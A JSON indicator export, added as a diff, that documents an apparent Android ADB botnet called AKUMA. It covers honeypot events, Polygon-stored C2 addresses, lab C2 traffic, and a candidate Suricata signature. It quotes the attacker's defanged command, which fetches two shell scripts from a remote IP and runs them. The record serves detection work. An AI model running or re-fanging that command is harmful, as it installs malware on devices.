@@ -1,0 +1,127 @@
+{
+  "case_id": "AKUMA-2026-10",
+  "export_type": "curated_public_indicators_not_full_original_logs",
+  "generated_utc_date": "2026-10-30",
+  "time_zone": "UTC",
+  "limitations": [
+    "ADBHoney records submitted commands; it does not establish a successful HTTP download or execution on a victim.",
+    "Session IDs, destination sensor IP, original non-Akuma events and private lab paths are omitted.",
+    "The two on-chain transactions and receipts were archived; historical getter results were not successfully archived.",
+    "The x64 sample acquisition HTTP response is not part of the present evidence bundle.",
+    "Decoded IPv4 addresses represent configured destinations; no live real-world C2 connection was verified.",
+    "A deliberate execution in a separate private lab on 2026-10-29 contacted an emulator, never the real decoded C2s.",
+    "Suricata 7.0.10 generated one alert from the original 334-packet Ethernet PCAP when offline replay disabled invalid checksum checks; a 27-packet control derived from that capture generated zero alerts.",
+    "No independent benign corpus, family-wide sensitivity test, or real-world false-positive rate is available; the original NFLOG linktype was unsupported by this Suricata version."
+  ],
+  "adbhoney": {
+    "destination_port": 5555,
+    "event_type": "adbhoney.command.input",
+    "command_defanged": "cd /data/local/tmp/; busybox wget hxxp://45[.]9[.]2[.]239:24381/bins/payloads/w.sh; sh w.sh; curl hxxp://45[.]9[.]2[.]239:24381/bins/payloads/c.sh; sh c.sh",
+    "event_count": 12,
+    "events": [
+      {"timestamp": "2026-10-27T09:09:48.170334Z", "src_ip": "154.80.128.124"},
+      {"timestamp": "2026-10-27T12:29:02.142868Z", "src_ip": "154.80.128.124"},
+      {"timestamp": "2026-10-27T14:42:26.362799Z", "src_ip": "154.80.128.124"},
+      {"timestamp": "2026-10-27T15:24:00.862457Z", "src_ip": "154.80.128.121"},
+      {"timestamp": "2026-10-27T15:42:59.073612Z", "src_ip": "154.80.128.121"},
+      {"timestamp": "2026-10-27T17:53:30.572856Z", "src_ip": "154.80.128.121"},
+      {"timestamp": "2026-10-27T20:35:25.317909Z", "src_ip": "154.80.128.124"},
+      {"timestamp": "2026-10-27T21:28:39.442121Z", "src_ip": "154.80.128.121"},
+      {"timestamp": "2026-10-27T22:46:35.602551Z", "src_ip": "154.80.128.124"},
+      {"timestamp": "2026-10-28T03:16:03.073268Z", "src_ip": "154.80.128.124"},
+      {"timestamp": "2026-10-28T08:55:23.535080Z", "src_ip": "154.80.128.124"},
+      {"timestamp": "2026-10-28T10:08:37.193419Z", "src_ip": "154.80.128.124"}
+    ],
+    "script_sha256": {
+      "adb_w.sample": "4890d90dd5eedd73f37ba627da8d1487114db5f5366772a9a464defc493c6943",
+      "adb_c.sample": "ec0a0374513a93cd3f34e6b0ce57fc7408706dfd687bd608c385ac8da54ce047"
+    }
+  },
+  "polygon": {
+    "chain_id_hex": "0x89",
+    "contract": "0x084a379b1e18c153212015bccd60295c948eaae2",
+    "setter_method_selector": "0x9846adc5",
+    "getter_method_selector": "0xc5a56599",
+    "transaction_status_hex": "0x1",
+    "setter_calls": [
+      {
+        "timestamp_utc": "2026-10-18T08:01:00Z",
+        "block_number": 95736742,
+        "transaction_hash": "0xd0191ebc33189b0cb5a31a9e08d87c4fa4e6df9e26994336c65d833cc51d3d58",
+        "from": "0x068920d6fe812c8b5dd78ed037e785a4951af47a",
+        "input": "0x9846adc500000000000000000000000000000000000000000000000000000000000000200000000000000000000000000000000000000000000000000000000000000026323030313a6462383a623965643a653839623a393932353a333564343a316166323a353835350000000000000000000000000000000000000000000000000000",
+        "stored_ipv6": "2001:db8:b9ed:e89b:9925:35d4:1af2:5855",
+        "decoded_ipv4": "45.205.1.121"
+      },
+      {
+        "timestamp_utc": "2026-10-23T17:22:48Z",
+        "block_number": 96047198,
+        "transaction_hash": "0xd3f178dd5ce75c8d97a856ceb0c3847987d715ad3999b3cf8de0f1151af116f4",
+        "from": "0x068920d6fe812c8b5dd78ed037e785a4951af47a",
+        "input": "0x9846adc500000000000000000000000000000000000000000000000000000000000000200000000000000000000000000000000000000000000000000000000000000025323030313a6462383a326434643a623231663a323538353a666635303a386535323a326439000000000000000000000000000000000000000000000000000000",
+        "stored_ipv6": "2001:db8:2d4d:b21f:2585:ff50:8e52:2d9",
+        "decoded_ipv4": "191.217.203.232"
+      }
+    ],
+    "latest_getter_2026_10_28": "2001:db8:2d4d:b21f:2585:ff50:8e52:2d9",
+    "historical_getter_responses_successfully_archived": false
+  },
+  "isolated_lab_2026_10_29": {
+    "provenance": "Two isolated VMs; original PCAP and fake-server JSONL retained privately with SHA256; no real C2 contact",
+    "rpc_domains_observed": ["polygon.drpc.org", "poly.api.pocket.network", "rpc.solidrpc.io"],
+    "rpc_method": "eth_call",
+    "rpc_selector": "0xc5a56599",
+    "rpc_provider_count_from_static_binary": 9,
+    "fake_rpc_ipv4": "withheld_private_lab_address",
+    "c2_register_26_bytes_hex": "00000001067838365f363409616b756d612e6164620100000743",
+    "register_fields": {"architecture": "x86_64", "bot_label": "akuma.adb", "online_cpu_count": 1, "ram_mib": 1859},
+    "heartbeat_hex": "0000",
+    "heartbeat_interval_seconds_approx": 60,
+    "heartbeat_count_in_fake_c2_log": 5,
+    "blocked_c2_test": {"seconds": 360, "repeat_syn_same_port": 5, "alternate_port_seen": false},
+    "allports_ethernet_capture": {
+      "source_sha256": "2e1c8cec0a0bb32e88e1795cbdf416ecb006f546bcd73f447355722d7fc13edc",
+      "original_ethernet_frames": 334,
+      "administrative_ssh_frames_excluded": 290,
+      "arp_frames_excluded": 10,
+      "remaining_ipv4_packets": 34,
+      "tcp_c2_packets": 17,
+      "tcp_syn_destination_ports_seen_from_bot": [443, 25565],
+      "tcp_c2_bytes_reassembled": 34,
+      "fake_c2_log_application_bytes": 36,
+      "difference_explanation": "Original Ethernet capture ended before final 2-byte heartbeat"
+    },
+    "candidate_network_signature": {
+      "type": "Suricata candidate engine-tested offline on 2026-10-30",
+      "prefix_21_bytes_hex": "00000001067838365f363409616b756d612e616462",
+      "reassembled_tcp_positive_matches": 1,
+      "benign_corpus_tested": false,
+      "scope": "AKUMA ADB x86_64 registration; not a family-wide detection"
+    },
+    "suricata_offline_validation_2026_10_30": {
+      "engine_version": "7.0.10",
+      "sid": 9001001,
+      "original_ethernet_packets": 334,
+      "original_ethernet_alerts_with_checksum_verification": 0,
+      "original_ethernet_alerts_with_k_none": 1,
+      "c2_subset_packets": 17,
+      "c2_subset_alerts": 1,
+      "negative_control_packets": 27,
+      "negative_control_alerts": 0,
+      "negative_control_is_independent": false,
+      "nflog_linktype": 239,
+      "nflog_result": "Not analyzed: pcap linktype unsupported by this Suricata version",
+      "suricata_alert_timestamp_utc": "2026-10-29T12:21:51.606630Z",
+      "original_c2_checkin_timestamp_utc_approx": "2026-10-29T12:24:07.386Z",
+      "alert_timestamp_caveat": "The alert's timestamp matches the first PCAP frame, not the registration flow; EVE pkt_src is stream (flow timeout).",
+      "validation_archive_sha256_private": "53efd5f5793904f0462dc616c8c89979aeeb936e8de335f00d203619a6992e9a"
+    }
+  },
+  "elf": {
+    "filename": "akuma.x64.sample",
+    "sha256": "d5de7f84a8547f8ef0213890850aaac5840f168ffeb6bca34cb0870fc9854817",
+    "size_bytes": 540768,
+    "embedded_key_hex": "1a7e92513795dbd1ab8afdeea8a1d8b9dd56100601f7a1fc7b0021ea81a5d662",
+    "configured_c2_port_tcp": 25565
+  }
+}
